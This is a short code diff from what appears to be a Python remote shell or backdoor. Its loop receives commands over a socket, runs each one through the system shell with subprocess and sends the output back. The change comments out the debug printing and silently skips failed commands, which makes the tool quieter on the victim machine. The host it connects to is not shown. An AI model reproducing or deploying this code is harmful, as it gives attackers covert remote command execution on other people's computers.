@@ -28,14 +28,15 @@ while True:
     command = sock.recv(1024).decode().rstrip()
 
     if (command != ''):
-        print("[DEBUG] command = ", command)
+        #print("[DEBUG] command = ", command)
         
         try: 
             result = subprocess.check_output(command, shell=True)
-            print(result.decode())
+            #print(result.decode())
             sock.send(result)
         except Exception as err:
-            print("Command failed.", err)
+            #print("Command failed.", err)
+            continue
         #sock.send(result)
     elif not command:
         break
